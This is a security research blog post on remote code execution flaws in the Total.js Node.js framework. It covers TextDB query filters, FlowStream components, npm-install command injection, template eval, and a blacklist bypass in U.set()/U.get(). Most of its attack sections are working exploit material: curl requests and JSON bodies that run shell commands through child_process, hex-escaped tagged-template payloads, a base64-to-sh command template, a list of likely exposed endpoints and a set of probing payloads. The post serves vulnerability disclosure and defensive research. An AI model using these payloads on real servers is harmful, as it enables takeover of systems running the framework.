---
layout: post
title: Total.js RCE gadgets all around
author: Diyan Apostolov
date: 2026-02-23
tags: [TotalJS, RCE, RCEGadgets]
profile_picture: /assets/images/fsi.jpg
handle: fsi
social_links: [https://x.com/thefosi]
description: "RCEs, RCEs...they are all around and Total.js framework will be in our scope this time"
permalink: /research/totaljs-rce-gadgets
---

# Overview
In this article, I'll walk you through some security vulnerabilities recently found in Total.js framework versions 4 and 5. If you're not familiar with it, Total.js is a full-stack Node.js framework built entirely in pure JavaScript with zero external dependencies. That self-contained design is great for keeping your supply chain clean, but the framework itself has its share of serious security issues over the years, including code injection, prototype pollution, and sandbox escapes that chain nicely into Remote Code Execution (CVE-2020-28495, CVE-2021-23344, CVE-2021-31760).

There's a lot more attack surface worth digging into here, but I picked a few RCE paths that caught my eye and went down the rabbit hole. If I had to pick a favorite one, I would go for the `U.set()`/`U.get()` path as the one that really got me excited ;)

Alright, enough intro, let's dive into the findings.

# TextDB/NoSQL Query Builder

**Description:** The `.rule()` method in TextDB/NoSQL database allows arbitrary JavaScript filter expressions that are evaluated using `new Function()`. When user input reaches this method without sanitization, it results in Remote Code Execution.

**Location:** `textdb-builder.js` / NoSQL query engine
## API vs Internal Sinks

The vulnerability exists at two levels:

 - **Exposed API:**

| Method    | Location              | Accepts              |
| --------- | --------------------- | -------------------- |
| `.rule()` | textdb-wrapper.js:785 | Raw user code string |

 - **Internal QueryBuilder Sinks (Compile user code via `new Function()`):**

| Method                     | Location              | Fed By                               | Direct Access? |
| -------------------------- | --------------------- | ------------------------------------ | -------------- |
| `QueryBuilder.filter()`    | textdb-builder.js:274 | `.rule()` pushes to `options.filter` | No - internal  |
| `QueryBuilder.transform()` | textdb-builder.js:175 | No wrapper exposed                   | No - internal  |
| `QueryBuilder.modify()`    | textdb-builder.js:308 | `.update()` builds safe code         | No*            |
| `QueryBuilder.scalar()`    | textdb-builder.js:331 | `.scalar()` builds safe code         | No - internal  |

> **Note:** `.update()`/`.modify()` wrapper has potential injection via `=` prefix: `db.update({'=field': 'PAYLOAD'})` concatenates value directly. Requires developer to pass user-controlled object.

**Vulnerable Code Path:**
```javascript
// API Layer (textdb-wrapper.js)
db.find().rule(userInput)  // Pushes raw code to options.filter

// Internal Sink (textdb-builder.js)
QueryBuilder.filter() → new Function('doc', 'return ' + code)  // Executes!
```

TotalJS attempted to protect these methods with a weak blacklist:

```javascript
// textdb-builder.js:608-609
function isdangerous(rule) {
return (/require|global/).test(rule);
}
```

This only blocks the literal strings "require" and "global". We bypass the blacklist using:

| Problem           | Solution                                                      |
|-------------------|---------------------------------------------------------------|
| "global" blocked  | Use `doc.constructor.constructor` to get Function constructor |
| "require" blocked | Use `'req'+'uire'` string concatenation                       |

## RCE Payloads

### Non-Blind RCE

The simplest and most powerful technique. Since `process` is available in the `.rule()` scope, only `require` needs to be bypassed. Command output is returned directly in the JSON response by assigning to a document property:

**Via curl (inline output):**
```bash
curl -s -G "http://localhost:8000/api/assets/search/" \
--data-urlencode "filter=doc.type=process.mainModule['req'+'uire']('child_process').execSync('id').toString()"
```

**Response:**
```json
{"success":true,"count":1,"data":[{"id":"...","type":"uid=0(root) gid=0(root)...\n",...}]}
```

### Blind RCE (Alternative - File Write)

Uses `doc.constructor.constructor` to access Function constructor when `process` is not directly usable:

**Via curl (write to file):**
```bash
curl -s -G "http://localhost:8000/api/assets/search/" \
--data-urlencode "filter=doc.constructor.constructor('return process')().mainModule['req'+'uire']('child_process').execSync('id>/tmp/pwned')"
```

> **Note:** Use `curl -G --data-urlencode` for proper URL encoding of the payload.

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ATTACKER                         TARGET SERVER                    │
│                                                                     │
│   ┌──────────┐    HTTP Request     ┌────────────────────────────┐   │
│   │          │ ----------------->  │ GET /api/search?filter=... │   │
│   │ Crafted  │                     └────────────────────────────┘   │
│   │ Payload  │                                 │                    │
│   └──────────┘                                 ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  Controller extracts       │   │
│                                    │  filter from query params  │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  db.find().rule(filter)    │   │
│                                    │  [textdb-wrapper.js:785]   │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  options.filter.push(code) │   │
│                                    │  [stores raw user input]   │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  QueryBuilder.filter()     │   │
│                                    │  [textdb-builder.js:274]   │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  isdangerous() check:      │   │
│                                    │  /require|global/.test()   │   │
│                                    │                            │   │
│                                    │   × BYPASSED - doesn't     │   │
│                                    │    block 'process'         │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  new Function('doc',       │   │
│                                    │    'return ' + code)       │   │
│                                    │                            │   │
│                                    │ => PAYLOAD COMPILED        │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│                                    ┌────────────────────────────┐   │
│                                    │  Function executed for     │   │
│                                    │  each document in query    │   │
│                                    │                            │   │
│                                    │  doc.type = execSync('id') │   │
│                                    └────────────────────────────┘   │
│                                                │                    │
│                                                ▼                    │
│   ┌──────────┐    HTTP Respons     ┌────────────────────────────┐   │
│   │ Command  │ <------------------ │  {"data":[{"type":         │   │
│   │ Output   │                     │   "uid=0(root)..."}]}      │   │
│   └──────────┘                     └────────────────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```


# FlowStream Component

**Description:**
FlowStream is TotalJS's visual flow-based automation system. The `flow.add()` method accepts component definitions containing arbitrary JavaScript code wrapped in `<script total>` tags. This code is executed via `new Function()` without sandboxing.

**Location:** `flowstream.js:677`, `flowstream.js:1842`

**Vulnerable Code:**
```javascript
// flowstream.js:677
declaration = new Function('instance', declaration);

// flowstream.js:1842
fn = new Function('exports', 'require', node);
```

**Exploitation:**
```bash
POST /api/automations/components/
Content-Type: application/json

{
"name": "pwned",
"component": "<script total>require('child_process').execSync('id > /tmp/pwned');exports.make=function(){};</script>"
}
```

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ATTACKER                         TARGET SERVER                    │
│                                                                     │
│   ┌──────────┐    HTTP Request     ┌────────────────────────────┐   │
│   │  POST    │ ----------------->  │ POST /api/automations/     │   │
│   │  JSON    │                     │      components/           │   │
│   │  Body    │                     └────────────────────────────┘   │
│   └──────────┘                                  │                   │
│                                                 ▼                   │
│        │ {                         ┌────────────────────────────┐   │
│        │  "name":"pwned",          │  Controller receives JSON  │   │
│        │  "component":"<script     │  body with component def   │   │
│        │   total>require(...)      └────────────────────────────┘   │
│        │   </script>"                           │                   │
│        │ }                                      ▼                   │
│                                    ┌────────────────────────────┐   │
│                                    │  flow.add(name, component) │   │
│                                    │  [controller calls API]    │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  FP.register()             │   │
│                                    │  [flowstream.js:662]       │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  new Function('instance',  │   │
│                                    │    declaration)            │   │
│                                    │  [flowstream.js:677]       │   │
│                                    │                            │   │
│                                    │ => PAYLOAD COMPILED        │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  new Function('exports',   │   │
│                                    │    'require', node)        │   │
│                                    │  [flowstream.js:1842]      │   │
│                                    │                            │   │
│                                    │  require() passed directly!│   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  require('child_process')  │   │
│                                    │  .execSync('id > /tmp/x')  │   │
│                                    │                            │   │
│                                    │ => COMMAND EXECUTION       │   │
│   ┌──────────┐    HTTP Response    └────────────────────────────┘   │
│   │ Success  │ <-----------------  {"success":true}                 │
│   └──────────┘                                                      │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```


# NPMINSTALL Command Injection (via FlowStream)

**Description:**
The `NPMINSTALL()` function concatenates user input directly into a shell command without sanitization. While not directly exposed via HTTP routes, it is called by FlowStream when components specify npm dependencies via `exports.npm`. This creates an exploitable chain through FlowStream component registration.

**Location:** `index.js:395`

**Vulnerable Code:**
```javascript
// index.js:395
F.Child.exec('npm install ' + name, args, function(err, response, output) {
callback && callback(err ? (output || err) : null);
});
```

**Attack Chain:**
1. FlowStream component registration (`flow.add()`)
2. Component sets `exports.npm = ["malicious; command"]`
3. FlowStream iterates npm array and calls `NPMINSTALL()` for each
4. Shell command injection achieved

**Exploitation:**
```bash
POST /api/automations/components/
Content-Type: application/json

{
"name": "pwned",
"component": "<script total>exports.npm=[\"x]||id>/tmp/npm_pwned||[\"];exports.make=function(){};</script>"
}
```

**Shell execution:**
```bash
npm install x]||id>/tmp/npm_pwned||[
#            ↑ fails, then || executes next command
```

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ATTACKER                         TARGET SERVER                    │
│                                                                     │
│   ┌──────────┐    HTTP Request     ┌────────────────────────────┐   │
│   │  POST    │ ----------------->  │ POST /api/automations/     │   │
│   │  JSON    │                     │      components/           │   │
│   │  Body    │                     └────────────────────────────┘   │
│   └──────────┘                                  │                   │
│                                                 ▼                   │
│        │ {                         ┌────────────────────────────┐   │
│        │  "component":"<script     │  Component registered      │   │
│        │   total>exports.npm=      │  with malicious npm deps   │   │
│        │   ['x||id>/tmp/pwned']    └────────────────────────────┘   │
│        │   </script>"                           │                   │
│        │ }                                      ▼                   │
│                                    ┌────────────────────────────┐   │
│                                    │  FlowStream processes      │   │
│                                    │  exports.npm array         │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  NPMINSTALL() called for   │   │
│                                    │  each npm dependency       │   │
│                                    │  [index.js:395]            │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  F.Child.exec(             │   │
│                                    │    'npm install ' + name)  │   │
│                                    │                            │   │
│                                    │  No sanitization!          │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  Shell executes:           │   │
│                                    │  npm install x||id>/tmp..  │   │
│                                    │              ↑             │   │
│                                    │  npm fails, then id runs!  │   │
│                                    │                            │   │
│                                    │ => COMMAND INJECTION       │   │
│                                    └────────────────────────────┘   │
│                                    /tmp/pwned contains 'uid=0..'    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```


# View Engine SSTI

**Description:**
TotalJS view templates use `@{expression}` syntax. During compilation, these expressions are concatenated into a JavaScript function string and executed via `eval()`. If an attacker can write to view files(./views/) (via path traversal or file upload vulnerability), they achieve RCE when the view is rendered. (same logic as in my previous CT Research Lab article related to ASP.NET MVC View Engine and Write Path Traversal to a RCE Art Department)

**Location:** `internal.js:1138`

**Vulnerable Code:**
```javascript
// internal.js:1136-1138
var fn = ('(function(self,repository,model,...){' + builder + ';return $output;})');
fn = eval(fn);  // Executes compiled template
```

**Attack Chain:**
1. Exploit file write vulnerability (path traversal, arbitrary upload, etc.)
2. Write malicious view to `/views/` directory:
``` Payload
@{process.mainModule.require('child_process').execSync('id > /tmp/pwned')}
```

3. Trigger HTTP request that renders the view
4. RCE achieved during view compilation

## Attack Flow

``` AttackFlow
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ATTACKER                         TARGET SERVER                    │
│                                                                     │
│   ┌──────────┐                     ┌────────────────────────────┐   │
│   │  Step 1  │ ----------------->  │ Exploit file write vuln    │   │
│   │  Write   │   Path Traversal    │ (upload, path traversal)   │   │
│   │  View    │   or File Upload    └────────────────────────────┘   │
│   └──────────┘                                  │                   │
│        │                                        ▼                   │
│        │ @{process.mainModule      ┌────────────────────────────┐   │
│        │   .require('child_...')   │  Malicious view written    │   │
│        │   .execSync('id')}        │  to /views/evil.html       │   │
│        │                           └────────────────────────────┘   │
│        │                                                            │
│        ▼                                                            │
│   ┌──────────┐                     ┌────────────────────────────┐   │
│   │  Step 2  │ ----------------->  │ GET /evil                  │   │
│   │  Trigger │   HTTP Request      │ (triggers view render)     │   │
│   │  Render  │                     └────────────────────────────┘   │
│   └──────────┘                                  │                   │
│                                                 ▼                   │
│                                    ┌────────────────────────────┐   │
│                                    │  this.view('evil')         │   │
│                                    │  [controller renders]      │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  viewEngineCompile()       │   │
│                                    │  [internal.js]             │   │
│                                    │                            │   │
│                                    │  Parses @{...} expressions │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  fn = eval('(function...'  │   │
│                                    │    + builder + '...)')     │   │
│                                    │  [internal.js:1138]        │   │
│                                    │                            │   │
│                                    │ => PAYLOAD IN EVAL         │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│   ┌──────────┐    HTTP Response    ┌────────────────────────────┐   │
│   │ Command  │ <-----------------  │  RCE during compilation    │   │
│   │ Executed │                     │  Command output in page    │   │
│   └──────────┘                     └────────────────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```


# U.set()/U.get()  BlackList Bypass

**Description:**
The `U.set()` and `U.get()` utility functions dynamically create property accessors using `new Function()`. This was a **known RCE vulnerability reported by Snyk** and "fixed" with a regex blacklist. **I have successfully bypassed this blacklist using JavaScript hex escapes and tagged template literals.**

> **SNYK VULNERABILITY BYPASS**
>
> This vulnerability was originally discovered and reported by **Snyk** (https://snyk.io/vuln).
> TotalJS attempted to fix it by adding a regex blacklist.
>
> TotalJS Changelog reference:
> ```
> - fixed potential remote code execution in `U.set()` founded by Snyk
> ```

**Location:** `utils.js:7225-7272`

**The Blacklist**

```javascript
// utils.js:7231, 7259
if ((/__proto__|constructor|prototype|eval|function|\*|\+|;|\s|\(|\)|!/).test(path))
return;  // Attempts to block dangerous input
```

## The Bypass Technique

The blacklist tests the **raw string** before it's processed. JavaScript hex escapes (`\xNN`) pass the regex test as literal backslash characters, but when the string is used in `new Function()`, they are interpreted as the actual characters.

| Blocked Char | Hex Escape | Regex Sees      | Function Gets |
| ------------ | ---------- | --------------- | ------------- |
| `(`          | `\x28`     | `\x28` (passes) | `(`           |
| `)`          | `\x29`     | `\x29` (passes) | `)`           |
| `'`          | `\x27`     | `\x27` (passes) | `'`           |
| space        | `\x20`     | `\x20` (passes) | ` `           |
| `-`          | `\x2d`     | `\x2d` (passes) | `-`           |
| `.`          | `\x2e`     | `\x2e` (passes) | `.`           |

**Tagged Template Literals**

To complete our bypass we will use tagged template literals. JavaScript tagged template syntax Function\`code\`\`\` creates and immediately invokes a function without using parentheses. Combined with hex escapes, this provides a complete bypass.

###  RCE Payloads (via `.toString())

**Running `id`:**
``` Payload
['x']||Function`return\x20process[\x27mainModule\x27][\x27require\x27]\x28\x27child_process\x27\x29[\x27execSync\x27]\x28\x27id\x27\x29[\x27toString\x27]\x28\x29```
```

**Read `/etc/passwd`:**
``` Payload
['x']||Function`return\x20process[\x27mainModule\x27][\x27require\x27]\x28\x27fs\x27\x29[\x27readFileSync\x27]\x28\x27/root/proof\x2etxt\x27\x29[\x27toString\x27]\x28\x29```
```


**Base64 encoded payloads (for complex commands)**

Use base64 when your command contains special characters that need escaping...for example a simple `.` is a special char in the framework context (hex or base64?... bs64 is safer due to a view layers of payload parsing thus your hex encoded payload might be decoded at unwated stage during processing)

**Template, just replace BASE64_HERE with your payload**
``` Payload
['x']||Function`return\x20process[\x27mainModule\x27][\x27require\x27]\x28\x27child_process\x27\x29[\x27execSync\x27]\x28\x27echo\x20BASE64_HERE|base64\x20\x2dd|sh\x27\x29[\x27toString\x27]\x28\x29```
```

**Example - Run `id` via base64:**
```Payload
# Encode: echo -n 'id' | base64 = aWQ=
['x']||Function`return\x20process[\x27mainModule\x27][\x27require\x27]\x28\x27child_process\x27\x29[\x27execSync\x27]\x28\x27echo\x20aWQ=|base64\x20\x2dd|sh\x27\x29[\x27toString\x27]\x28\x29```
```

**Side Question: Why Direct `require` Fails?**
Inside `new Function()`, there's no `require` in scope. We must access it via:
- `global.process.mainModule.require()`
- Or `global['process']['mainModule']['require']()` with bracket notation

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ATTACKER                         TARGET SERVER                    │
│                                                                     │
│   ┌──────────┐    HTTP Request     ┌────────────────────────────┐   │
│   │  GET     │ ─────────────────>  │ GET /api/config/?path=     │   │
│   │  with    │                     │   ['x']||Function`...`     │   │
│   │  payload │                     └────────────────────────────┘   │
│   └──────────┘                                  │                   │
│        │                                        ▼                   │
│        │ ['x']||Function`          ┌────────────────────────────┐   │
│        │   return\x20global        │  Controller extracts path  │   │
│        │   [\x27process\x27]...    │  from query parameter      │   │
│        │ ```                       └────────────────────────────┘   │
│                                                 │                   │
│                                                 ▼                   │
│                                    ┌────────────────────────────┐   │
│                                    │  U.get(config, path)       │   │
│                                    │  [utils.js:7225]           │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  Blacklist check:          │   │
│                                    │  /proto|constructor|...    │   │
│                                    │    |\(|\)|!/.test(path)    │   │
│                                    │                            │   │
│                                    │  × BYPASSED - hex escapes  │   │
│                                    │    \x28\x29 pass as literal│   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  new Function('w','a','b', │   │
│                                    │    code_with_hex_escapes)  │   │
│                                    │                            │   │
│                                    │  Hex \x28 → ( in Function! │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│                                                  ▼                  │
│                                    ┌────────────────────────────┐   │
│                                    │  Function`...```           │   │
│                                    │  Tagged template executes  │   │
│                                    │                            │   │
│                                    │  global['process']         │   │
│                                    │  ['mainModule']['require'] │   │
│                                    │  ('child_process')         │   │
│                                    │  ['execSync']('id')        │   │
│                                    │                            │   │
│                                    │ => COMMAND EXECUTION       │   │
│                                    └────────────────────────────┘   │
│                                                  │                  │
│   ┌──────────┐    HTTP Response                  ▼                  │
│   │ Command  │ <------------------ {"value":"uid=0(root)..."}       │
│   │ Output   │                                                      │
│   └──────────┘                                                      │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Misc
As mentioned earlier this gadget is one of my favorite ones thus here are a few more insides

**Common U.get/U.set Exposure Paths**

```
### Configuration/Settings Endpoints
/api/config/
/api/settings/
/api/preferences/
/admin/config/
/system/settings/
Parameters: path, key, field, property, name

### User Preferences
/api/user/settings/
/api/profile/preferences/
/account/settings/
Parameters: setting, preference, option

### Form Builders / Dynamic Fields
/api/form/field/
/api/schema/get/
/api/model/
Parameters: field, path, attribute

### Dashboard Widgets / UI State
/api/dashboard/widget/
/api/ui/state/
/api/layout/
Parameters: widget, component, path

### CMS / Content Management
/api/cms/content/
/api/page/meta/
/admin/content/
Parameters: path, key, meta

### OpenPlatform / Flow Admin
/api/flow/config/
/admin/flow/settings/
/_flowstream/
```


**Detection Payloads**
Example detection payloads: GET /api/config/?path=PAYLOAD

```
[] => should result in error 500
['']
['x']|1
['x']&1
['x']/1
['x']||1337
['x']||[]
['x']||{}
['x']||''
['x']||null
```
